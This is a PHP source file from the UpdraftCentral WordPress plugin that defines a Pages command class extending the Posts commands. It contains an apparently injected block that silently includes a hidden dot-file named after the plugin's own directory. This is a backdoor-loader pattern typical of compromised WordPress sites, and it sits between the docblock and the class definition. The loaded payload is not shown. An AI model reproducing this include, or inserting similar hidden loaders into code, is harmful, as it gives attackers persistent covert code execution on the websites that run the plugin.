<?php

if (!defined('UPDRAFTCENTRAL_CLIENT_DIR')) die('No access.');

// Load the posts command class since we're going to be extending it for our page module service/command
// class in order to minimize redundant shareable methods.
if (!class_exists('UpdraftCentral_Posts_Commands')) require_once('posts.php');

/**
 * Handles Pages Commands
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class UpdraftCentral_Pages_Commands extends UpdraftCentral_Posts_Commands {

	protected $post_type = 'page';
}
